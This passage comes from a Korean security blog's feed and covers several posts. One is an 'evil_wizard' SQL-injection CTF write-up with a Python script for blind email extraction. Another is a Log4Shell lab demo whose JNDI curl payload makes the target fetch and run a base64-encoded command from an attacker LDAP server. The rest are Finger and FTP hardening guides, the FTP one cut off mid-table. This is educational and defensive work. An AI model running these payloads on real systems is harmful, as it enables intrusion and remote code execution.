class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;evil_wizard&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_evil_wizard where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>; <span class="comment">// same with hell_fire? really?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$rows</span> = mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$result</span> = mysqli_fetch_array(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select email from prob_evil_wizard where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;evil_wizard&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>order 파라미터</code>에서 <code>prob</code> <code>proc</code> <code>union</code> <code>sleep</code> <code>benchmark</code> <code>_</code> <code>.</code>  를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>admin</code>의 <code>email</code>을 필터링하고있습니다.</p>
<br>

<br>

<h2 id="11-줄-해석"><a href="#11-줄-해석" class="headerlink" title="11 줄 해석"></a>11 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<p><code>email</code>의 값을 찾아야 하는 <code>Blind SQLi</code>입니다.</p>
<p><code>order by</code> 절을 이용하여 문제를 풀어야 합니다.</p>
<p>이전 문제인 <code>hell_fire</code>과 다른 점은 필터링 하는 문자가 추가됐고, <code>admin</code>의 score이 <code>rubiya</code>의 score 보다 작아서 <code>order by 1 2 3</code> 했을 때 모두 동일하다는 점입니다.</p>
<br>

<br>

<p>저는 아래 사진과 같이 정렬 순서로 참 / 거짓을 판별하여 <code>email</code>을 찾아내었습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_1.png">

<br>

<p><code>if(조건, 참일 때 결과, 거짓일 때 결과)</code>를 사용해주면 됩니다.</p>
<br>

<p>참 일 때 결과를 <code>admin</code> 행이 첫 번째로 오도록 만들어주었고, 거짓일 때 <code>rubiya</code> 행이 첫 번째로 오도록 만들어주었습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_2.png">

<br>

<blockquote>
<p>참</p>
</blockquote>
<br>

<br>

<hr>
<img src="/images/Lord of SQLInjection/evil_wizard/solve_3.png">

<br>

<blockquote>
<p>거짓</p>
</blockquote>
<br>

<br>

<p><code>email</code>의 길이를 구하기 위한 쿼리문은 아래와 같습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123; i &#125;&#x27;,1,9999)%23</span><br></pre></td></tr></table></figure>

<p><code>i</code> 값을 증가 시키면서 <code>email</code>의 길이를 구해주면 됩니다.</p>
<br>

<br>

<p><code>email</code>의 길이를 구하면 한 글자 씩 추출하여 패스워드를 찾으면 됩니다.</p>
<p><code>email</code>를 찾기 위한 쿼리문은 아래와 같습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and substr(email,&#123; i &#125;,1)=char(&#123; j &#125;),1,9999)%23</span><br></pre></td></tr></table></figure>

<p><code>substr</code> 함수로 한 글자 씩 추출하여 <code>pw</code>를 찾습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">email = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123;&#125;&#x27;,1,9999)%23&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;th&gt;score&lt;/th&gt;&lt;tr&gt;&lt;td&gt;admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;if(id=&#x27;admin&#x27; and substr(email,&#123;&#125;,1)=char(&#123;&#125;),1,9999)%23&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), j)</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;th&gt;score&lt;/th&gt;&lt;tr&gt;&lt;td&gt;admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            email += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(i,<span class="string">&quot;번째 문자 찾는 중 .. : &quot;</span>,email)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;EMAIL : &quot;</span>,email.lower())</span><br></pre></td></tr></table></figure>



<br>

<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_4.png">

<br>

<p><code>email</code>의 길이입니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_5.png">

<br>

<p><code>email</code>를 한 글자 씩 추출하여 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_6.png">

<br>

<p>** 파이썬에서 패스워드가 대문자로 추출됩니다. 그 이유는 MySQL에서는 대소문자 구분이 없기 때문에 아스키 코드가 더 작은 대문자로 추출됩니다. 소문자로 바꿔주어 넣어주면 됩니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Log4Shell] CVE-2021-44228</title>
    <url>/2021/12/14/2021-12-14-Log4Shell%20CVE-2021-44228/</url>
    <content><![CDATA[<h1 id="🔎-Log4j-란"><a href="#🔎-Log4j-란" class="headerlink" title="🔎 Log4j 란"></a>🔎 Log4j 란</h1><br>

<p>JAVA 기반의 Application에서 사용 가능한 오픈소스로 서비스 동작 과정에서 일어나는 모든 기록을 남겨 침해사고 및 이상징후를 점검하기 위해 필수적으로 필요한 기능입니다.</p>
<br>

<p>현재 Log4j 취약점인 Log4Shell(CVE-2021-44228)은 CVSS 스코어 10점으로 가장 높은 심각도를 가지고 있고 JNDI(Java Naming and Directory Interface) 인젝션 취약점을 이용하면 RCE(원격 코드 실행)가 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-환경-구성-후-실습"><a href="#🔔-환경-구성-후-실습" class="headerlink" title="🔔 환경 구성 후 실습"></a>🔔 환경 구성 후 실습</h1><br>

<p>어떤 분이 Log4Shell 취약점 환경을 Docker로 구성 해주셔서 쉽게 실습을 해볼 수 있었습니다.</p>
<blockquote>
<p>버전 정보 : Log4j 2.14.1 (spring-boot-starter-log4j2 2.6.1) &amp; JDK 1.8.0_181</p>
</blockquote>
<br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안동향/Log4Shell_CVE-2021-44228/logo.png"></object>
<p>Log4Shell sample vulnerable application (CVE-2021-44228)</p><p>GitHub</p>
<a href="https://github.com/christophetd/log4shell-vulnerable-app"></a>
</div></div>

<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
<th>공격자</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102:8080</td>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="Start-Docker"><a href="#Start-Docker" class="headerlink" title="Start Docker"></a>Start Docker</h2><br>

<blockquote>
<p>$ docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app</p>
</blockquote>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/start_docker.png">

<br>

<br>

<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><br>

<blockquote>
<p>$ curl {공격대상} -H ‘X-Api-Version: ${jndi:ldap://공격자 IP}’</p>
</blockquote>
<br>

<br>

<h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><br>

<blockquote>
<p>$ curl -i -k 192.168.219.102:8080 -H ‘X-Api-Version: ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}’</p>
</blockquote>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/attacker_test.png">

<br>

<br>

<h3 id="취약한-Server-Log"><a href="#취약한-Server-Log" class="headerlink" title="취약한 Server Log"></a>취약한 Server Log</h3><br>

<blockquote>
<p>2021-12-14 12:20:00.052  INFO 1 — [nio-8080-exec-3] HelloWorld : Received a request for API version ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}</p>
</blockquote>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/server_log_1.png">

<br>

<br>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><br>

<h3 id="대기중인-공격자-LDAP-Server"><a href="#대기중인-공격자-LDAP-Server" class="headerlink" title="대기중인 공격자 LDAP Server"></a>대기중인 공격자 LDAP Server</h3><br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/ldap_server_1.png">

<br>

<p>대기중인 공격자의 <code>LDAP Server</code> 입니다.</p>
<br>

<br>

<h3 id="공격자-LDAP-Server로-요청"><a href="#공격자-LDAP-Server로-요청" class="headerlink" title="공격자 LDAP Server로 요청"></a>공격자 LDAP Server로 요청</h3><br>

<blockquote>
<p>$ curl 192.168.219.102:8080 -H ‘X-Api-Version: </p>
<p>${jndi:ldap://192.168.219.103:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9rb3VuOWh3YW4=}’</p>
</blockquote>
<br>

<p><code>touch /tmp/koun9hwan</code>을 <code>base64</code>로 인코딩 하면<code>dG91Y2ggL3RtcC9rb3VuOWh3YW4=</code> 이와같이 나오고, 공격에 성공하면 <code>/tmp/koun9hwan</code> 파일이 만들어집니다.</p>
<br>

<p>취약한 서버에서 공격자 LDAP Server로 요청을 보내면 공격자의 LDAP Server가 악성코드, 백도어 등을 다운받도록 요청을 반환합니다.</p>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/ldap_server_2.png">

<br>

<br>

<h3 id="취약한-Server-Log-1"><a href="#취약한-Server-Log-1" class="headerlink" title="취약한 Server Log"></a>취약한 Server Log</h3><br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/server_log_2.png">

<br>

<br>

<h3 id="생성된-파일-확인"><a href="#생성된-파일-확인" class="headerlink" title="생성된 파일 확인"></a>생성된 파일 확인</h3><br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/exploit_server.png">

<br>

<p><code>/tmp</code> 경로에 <code>koun9hwan</code> 파일이 생성된것을 확인할 수 있습니다.</p>
<br>

<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/log4shell.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-해결방안"><a href="#🔒-해결방안" class="headerlink" title="🔒 해결방안"></a>🔒 해결방안</h1><br>

<table>
<thead>
<tr>
<th></th>
<th>Log4Shell</th>
</tr>
</thead>
<tbody><tr>
<td>영향을 받는 버전</td>
<td>Apache Log4j 2.0-beta9 ~ 2.14.1 모든 버전</td>
</tr>
<tr>
<td>해결방안</td>
<td>최신버전(log4j 2.15)으로 패치<br />2.0-beta9 ~ 2.10.0 : JndiLookup 클래스를 경로에서 제거<br />2.10 ~ 2.14.1 : log4j2.formatMsgNoLookups 또는 LOG4J_FORMAT_MSG_NO_LOOKUPS 환경 변수를 true로 설정</td>
</tr>
</tbody></table>
<br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안동향/Log4Shell_CVE-2021-44228/logo.png"></object>
<p>Apache Log4j 2 보안 업데이트 권고</p><p>KISA</p>
<a href="https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389"></a>
</div></div>
]]></content>
      <categories>
        <category>보안동향</category>
      </categories>
      <tags>
        <tag>보안용어</tag>
        <tag>보안동향</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-19 Finger 서비스 비활성화</title>
    <url>/2021/12/20/2021-12-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-19%20Finger%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>finger 서비스 비활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-19</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="Finger"><a href="#Finger" class="headerlink" title="Finger?"></a>Finger?</h2><br>

<p>Finger은 로컬 사용자나 원격 사용자의 <code>계정 정보를 확인</code>할 수 있는 명령어입니다.</p>
<p>해당 명령어는 지정된 사용자의 정보를 <code>/etc/passwd</code> 파일에서 읽고 보여 줍니다.</p>
<br>

<p>Finger 명령어로 확인할 수 있는 사용자의 정보는 <code>UID</code> <code>사용자명</code> <code>홈디렉토리 위치</code> <code>기본 사용 쉘</code> <code>현재 로그인 정보</code> 입니다.</p>
<p>지정된 사용자 홈 디렉토리에 <code>.plan</code> 파일이 존재한다면 Finger 명령어 수행 결과 마지막에 그 내용을 추가하여 보여 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>Finger를 통해서 네트워크 외부에서 해당 시스템에 등록된 사용자 정보를 확인할 수 있어 비인가자에게 사용자 정보가 조회 되는 것을 차단하기 위해 점검합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>비인가자에게 사용자 정보가 조회되어 패스워드 공격을 통한 시스템 권한 탈취 가능성이 있으므로 사용하지 않는다면 해당 서비스를 중지해야합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>네트워크 외부에서 해당 시스템에 등록된 사용자 정보를 확인할 수 있다고 해서 환경 구성 후 확인해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>finger 활성화된 서버</th>
<th>외부 서버 (비인가자)</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
<td>192.168.219.104</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX<br />HP-UX, <br />SOLARIS 5.9 이하 버전</td>
<td><code>#cat /etc/inetd.conf</code><br /><code>#finger stream tcp nowait bin /usr/lbin/fingered</code><br /><code>fingerd</code> 주석처리 확인</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code>#inetadm | grep &quot;finger&quot;</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td><code>#ls -alL /etc/xinetd.d/* | egrep &quot;echo finger&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="Finger-서비스-활성화-여부-확인"><a href="#Finger-서비스-활성화-여부-확인" class="headerlink" title="Finger 서비스 활성화 여부 확인"></a>Finger 서비스 활성화 여부 확인</h2><br>

<blockquote>
<p># ls -alL /etc/xinetd.d/* | egrep finger</p>
</blockquote>
<blockquote>
<p># netstat -tulpn | grep LISTEN</p>
</blockquote>
<br>

<br>

<p><code>주요정보통신기반시설 취약점 진단 가이드</code>에서 제시한 방법은 <code>| egrep &quot;echo finger&quot;</code>인데 왜 <code>echo</code>를 붙이는지 모르겠고 결과도 안 나왔습니다.</p>
<br>

<p>로컬 내에서 <code>finger</code> 명령어 사용과 외부에서 사용 가능한지 <code>finger Port(79번)</code>를 통해 점검하면 될 것 같습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/grep.png">

<br>

<br>

<h2 id="외부-서버에서-Finger-서비스-사용"><a href="#외부-서버에서-Finger-서비스-사용" class="headerlink" title="외부 서버에서 Finger 서비스 사용"></a>외부 서버에서 Finger 서비스 사용</h2><br>

<blockquote>
<p># finger @IP주소</p>
</blockquote>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/finger.png">

<br>

<p>현재 로그인 중인 사용자들의 정보를 볼 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX<br />HP-UX, <br />SOLARIS 5.9 이하 버전</td>
<td>1) <code>/etc/inetd.conf</code> 파일에서 finger 서비스 라인 <code>#(주석)</code>처리<br />    (수정 전) <code>finger stream tcp nowait bin /usr/lbin/fingered fingerd</code><br />    (수정 후) <code>#finger stream tcp no wait bin /usr/lbin/fingered fingerd</code><br /><br />2) <code>inetd</code> 서비스 재시작<br />    <code>#ps -ef |grep inetd</code><br />      <code>root 141 1 0 15:03:22 ? 0:01 /usr/sbin/inetd -s</code><br />    <code>#kill -HUP [PID]</code><br /></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>inetadm -d “중지하고자 하는 데몬” 명령으로 서비스 데몬 중지<br />    <code>#inetadm -d svc:/etwork/finger:default</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>1) vi 편집기를 이용하여 “/etc/xinetd.d/finger” 파일 열기<br /><br />2) 아래와 같이 설정 (Disable = yes 설정)<br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/vi.png"><br /><br />3) xinetd 서비스 재시작<br />    <code>#service xinetd restart</code></td>
</tr>
</tbody></table>
<br>

<br>

<p><code>finger 파일</code>에서 <code>Disable = yes</code> 해준 결과 아래와 같이 연결이 안되는 것을 확인할 수 있습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/finger_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line">PortResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/xinetd.d/finger | grep <span class="built_in">disable</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *no* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=O</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=X</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">port=`netstat -tulpn | grep LISTEN | grep 79`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$port</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        PortResult=OPEN</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        PortResult=CLOSE</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e finger 사용여부 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>finger 포트\(79번\) : <span class="string">&quot;<span class="variable">$PortResult</span>&quot;</span> | tee /root/result/u-19.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/xinetd.d/finger</code> 파일에서 <code>disable</code> 단어가 포함된 줄을 변수에 저장 후 <code>no</code>라는 단어가 포함되어 있으면 <code>finger</code> 서비스가 실행되고 있는 상태로 판단하였습니다.</p>
<p><code>finger</code> 포트인 <code>79</code>번 포트가 <code>OPEN / CLOSE</code> 상태인지 확인할 수 있도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-19</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-20 Anonymous FTP 비활성화</title>
    <url>/2021/12/20/2021-12-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-20%20Anonymous%20FTP%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>익명 FTP 접속 허용 여부 점검입니다.</p>
<p>항목코드는 <code>U-20</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP?"></a>FTP?</h2><br>

<p>파일 전송 프로토콜(File Transfer Protocol, FTP)은 TCP/IP 프로토콜을 가지고 서버와 클라이언트 사이의 파일 전송을 하기 위한 프로토콜입니다.</p>
<p>포트는 <code>21</code>번 포트를 사용합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>실행중인 FTP 서비스에 익명 FTP 접속이 허용되고 있는지 확인하여 접속 허용을 차단하는 것을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>익명 FTP를 사용 시 anonymous 계졍으로 로그인 후 디렉터리에 쓰기 권한이 설정되어 있다면 악의적인 사용자가 local Exploit을 사용하여 시스템에 대한 공격을 가능하게 합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>FTP 활성화된 서버</th>
<th>외부 서버 (비인가자)</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
<td>192.168.219.104</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
